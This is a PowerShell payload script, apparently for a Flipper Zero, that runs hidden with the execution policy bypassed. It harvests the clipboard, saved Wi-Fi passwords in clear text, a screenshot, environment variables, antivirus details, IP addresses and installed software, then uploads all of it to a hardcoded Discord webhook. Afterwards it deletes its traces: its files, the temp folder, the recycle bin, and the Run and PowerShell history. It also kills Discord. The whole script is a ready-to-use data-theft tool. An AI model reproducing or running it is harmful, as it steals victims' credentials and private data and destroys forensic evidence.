PowerShell.exe -WindowStyle hidden -NoP -Ep Bypass {

#CHANGE URL TO YOUR URL
  $url="https://discord.com/api/webhooks/1258951712375570523/ZzVRGI8GumQjTSz_s2geTSXNsk0tE9zp5_56xGu9u2GEHwjLmXhsYPL4G4GMYGmjOC3f" ;
#Get PC Name+Date+Time
  $namepc = Get-Date -UFormat "$env:computername-$env:UserName-%m-%d-%Y_%H-%M-%S"

# Get PC ClipBoard
  echo "" > "$env:temp\stats-$namepc.txt";
  echo "####PC ClipBoard under this line:" >> "$env:temp\stats-$namepc.txt";
  echo "####################################" >> "$env:temp\stats-$namepc.txt";
  Get-Clipboard >> "$env:temp\stats-$namepc.txt";
  echo "####################################" >> "$env:temp\stats-$namepc.txt";
  echo "####End ClipBoard" >> "$env:temp\stats-$namepc.txt";

# Get WifiPassword
echo "" > "$env:temp\WIFI-$namepc.txt";
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | out-file "$env:temp\WIFI-$namepc.txt";

# Screenshot
  cd "$env:temp";
  echo 'function Get-ScreenCapture' > "d.ps1";
  echo '{' >> "d.ps1";
  echo '    begin {' >> "d.ps1";
  echo '        Add-Type -AssemblyName System.Drawing, System.Windows.Forms' >> "d.ps1";
  echo '        Add-Type -AssemblyName System.Drawing' >> "d.ps1";
  echo '        $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |' >> "d.ps1";
  echo '            Where-Object { $_.FormatDescription -eq "JPEG" }' >> "d.ps1";
  echo '    }' >> "d.ps1";
  echo '    process {' >> "d.ps1";
  echo '        Start-Sleep -Milliseconds 44' >> "d.ps1";
  echo '            [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")' >> "d.ps1";
  echo '        Start-Sleep -Milliseconds 550' >> "d.ps1";
  echo '        $bitmap = [Windows.Forms.Clipboard]::GetImage()' >> "d.ps1";
  echo '        $ep = New-Object Drawing.Imaging.EncoderParameters' >> "d.ps1";
  echo '        $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)' >> "d.ps1";
  echo '        $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture"' >> "d.ps1";
  echo '        $bitmap.Save("${screenCapturePathBase}.jpg", $jpegCodec, $ep)' >> "d.ps1";
  echo '    }' >> "d.ps1";
  echo '}' >> "d.ps1";
  echo 'Get-ScreenCapture' >> "d.ps1";
  sleep 1
  $screencapture = echo $env:temp"\"$env:UserName"_Capture"
  powershell -c $env:temp\d.ps1;
  $Screencap = "$env:temp\d.ps1";

# Get PC information
  dir env: >> "$env:temp\stats-$namepc.txt";
# List which AntiVirus Product is being used
  Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct >> "$env:temp\stats-$namepc.txt";
# Get public IP
  $pubip = (Invoke-WebRequest -UseBasicParsing -uri "http://ifconfig.me/").Content
  echo "PUBLIC IP: $pubip" >> "$env:temp\stats-$namepc.txt";
# Get Local IP
  ipconfig /all >> "$env:temp\stats-$namepc.txt";
# List all installed Software
  echo "Installed Software:" >> "$env:temp\stats-$namepc.txt";
  Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize >> "$env:temp\stats-$namepc.txt";
  Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize >> "$env:temp\stats-$namepc.txt";

#UPLOAD
cd $env:temp
# Send Name Computer to discord
  $Body=@{ content = "**Stats from Flipper-Zero on user:** $env:UserName, on pc: $env:computername"};
  Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
# Upload Stat
  curl.exe -F "file1=@stats-$namepc.txt" $url;
# Upload wifi password
  curl.exe -F "file2=@WIFI-$namepc.txt" $url;

# Upload screenshot
  sleep 1
  $Body=@{ content = "**Screen Capture before attack start**"};
  Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
  curl.exe -F "file2=@$screencapture.jpg" $url;

#Delete all file
# Delete stat
  Remove-Item "stats-$namepc.txt" -Force -Recurse;
# Delete wifi password
  Remove-Item "WIFI-$namepc.txt" -Force -Recurse;
# Delete screenshot
  Remove-Item  $screencapture* -Force -Recurse;
# Delete this script
  Remove-Item  $env:temp\p.ps1 -Force -Recurse;
# Delete screencapture script
  Remove-Item $env:temp\d.ps1 -Force -Recurse;

# 1empty temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# 1delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# 1Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# 1Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

#Last discord kill before quit
taskkill /IM Discord.exe /F

# Clear History powershell:
  [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();
# Clear run powershell:
  Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU;
}
